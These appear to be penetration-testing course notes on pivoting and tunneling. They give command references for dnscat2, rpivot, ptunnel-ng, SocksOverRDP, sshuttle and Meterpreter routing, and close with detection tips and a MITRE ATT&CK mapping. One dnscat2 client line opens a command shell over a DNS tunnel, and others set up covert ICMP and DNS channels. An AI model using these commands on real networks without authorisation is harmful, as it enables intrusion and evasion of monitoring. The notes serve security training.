# ADDENDUM 04: Pivoting, Tunneling & Port Forwarding — Advanced

## Lateral Movement vs Pivoting vs Tunneling
| Concept | Definition | Example |
|---------|-----------|---------|
| **Lateral Movement** | Spreading WIDE within same network | Host to host on 10.129.x.0/24 |
| **Pivoting** | Crossing network BOUNDARIES | DMZ → internal AD DC |
| **Tunneling** | Obfuscating/encapsulating traffic | SSH inside DNS or ICMP |

## First Steps on New Host
1. **Check privilege level** → `whoami` / `id`
2. **Check network connections** → `ipconfig` / `ifconfig` → look for additional NICs
3. **Check for VPN/remote access software** → look for virtual adapters

**If additional NIC → new subnet → MUST pivot**

## Network Diagramming
Use **Draw.io (diagrams.net)** throughout engagement. Document every host, subnet, and pivot path.

## NAT + SOCKS
SOCKS proxies CAN pivot from NAT networks. Receiving host sees pivot host IP, not attacker IP.

## SOCKS4 vs SOCKS5
| Feature | SOCKS4 | SOCKS5 |
|---------|--------|--------|
| Auth | No | Yes |
| UDP | No | Yes |
| IPv6 | No | Yes |
If proxychains fails with SOCKS4, try SOCKS5 in proxychains.conf.

## dnscat2 Complete Reference
```bash
# Server (authoritative DNS mode)
sudo ruby dnscat2.rb --dns host=IP,port=53,domain=tunnel.dom --no-cache

# Server (direct mode — without domain)
sudo ruby dnscat2.rb --dns server=IP,port=53 --secret=SECRET

# Client Linux
./dnscat --dns server=IP,port=53 --secret=SECRET

# Client Windows PowerShell
Start-Dnscat2 -DNSserver IP -Domain dom -PreSharedSecret SECRET -Exec cmd

# Interact
dnscat2> windows           # List sessions
dnscat2> window -i 1       # Interact with session 1
# Ctrl+Z to return to main console

# Console commands: echo, help, kill, quit, set, start, stop, tunnels, unset, window, windows
# Options: auto_attach, history_size
```

## rpivot Complete Reference
```bash
# Server
sudo python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Client (basic)
python2.7 client.py --server-ip IP --server-port 9999

# Client (NTLM proxy auth)
python client.py --server-ip IP --ntlm-proxy-ip PROXY --ntlm-proxy-port 8080 --domain DOM --user USER --pass PASS

# Usage
proxychains firefox-esr 172.16.5.135:80

# Transfer
scp -r rpivot ubuntu@PIVOT:/home/ubuntu/

# Python 2.7 via pyenv
pyenv install 2.7 && pyenv shell 2.7
```

## ptunnel-ng Complete Reference
```bash
# Build static binary
sed -i '$s/.*/LDFLAGS=-static .\/configure/' autogen.sh
sudo ./autogen.sh
make

# Server (destination host)
sudo ./ptunnel-ng -r DEST -R PORT
# Drops privileges after init

# Client (pivot host)
sudo ./ptunnel-ng -p PIVOT -l LOCAL_PORT -r DEST -R PORT
# Then: ssh -D 9050 -p LOCAL_PORT -l user 127.0.0.1

# Stats: I/O: 0.00/0.00 mb  ICMP I/O/R: 248/22/0  Loss: 0.0%
# Wireshark: Without tunnel=TCP/SSHv2, With tunnel=ICMP Echo Request/Reply
```

## SocksOverRDP
- Uses **Dynamic Virtual Channels (DVC)** — same tech as clipboard/audio sharing
- Setup: `regsvr32.exe SocksOverRDP-Plugin.dll`
- Verify: `netstat -antb | findstr 1080` → should show LISTENING on 127.0.0.1:1080
- Use **ProxifierPE.zip** (portable edition)
- Profile → Proxy Servers → Add → 127.0.0.1:1080 SOCKS4/5

## sshuttle Details
```bash
sshuttle -r user@PIVOT 172.16.5.0/23  # Basic
sshuttle -r user@PIVOT 172.16.5.0/23 --dns  # Include DNS

# Limitations:
# UDP: off (not available with nat method)
# DNS: available with --dns flag

# Persistent: sudo apt install autossh
# Creates iptables/ip6tables rules for sshuttle chain
# Shows Python versions on connection
```

## Meterpreter Ping Sweep
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Linux for-loop
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Windows PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

# WARNING: Run at least twice for ARP cache build
```

## Meterpreter Autoroute (Deprecated)
```bash
# Legacy (shows deprecation notice)
run autoroute -s 172.16.5.0/23
run autoroute -p  # List routes

# Modern
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK 255.255.254.0
run
```

## Portfwd Help
```bash
meterpreter > help portfwd
# Options: -i (index), -l (local port), -L (local host), -p (remote port), -r (remote host), -R (remote forward)
```

## SSH Forward Verification
```bash
netstat -antp | grep 1234
nmap -v -sV -p1234 localhost
```

## Netstat for Defensive Analysis
Can view established sessions, identify suspicious connections, discover management interfaces.

## Windows Firewall Blocks ICMP
Windows Defender blocks ICMP by default. Affects ping sweeps through proxychains → use TCP-based discovery (`nmap -sT`).

## Detection & Prevention
**Baseline:** DNS records, network device backups, DHCP configs, app inventory, host list, dual-homed hosts, network diagrams
**Tools:** Netbrain, diagrams.net
**Beaconing detection:** Regular intervals = C2
**Non-standard port detection:** Port 444 vs 443 suspicious

### MITRE ATT&CK Mapping
| MITRE | Tactic | Technique |
|-------|--------|-----------|
| T1133 | Initial Access | External Remote Services |
| T1021 | Lateral Movement | Remote Services |
| T1571 | C2 | Non-Standard Ports |
| T1572 | C2 | Protocol Tunneling |
| T1090 | C2 | Proxy Use |

## Troubleshooting Gotchas
- **Lab spawn:** Wait 3-5 minutes for full config
- **GLIBC:** ptunnel-ng and chisel must match target glibc; use older prebuilt versions
- **Chisel:** Uses WebSocket (ws://), shows latency, "tun: SSH connected", try different version if error
- **Meterpreter autoroute:** Shows deprecation notice, use post module instead
- **Proxychains + ICMP:** Windows blocks ICMP → use TCP discovery
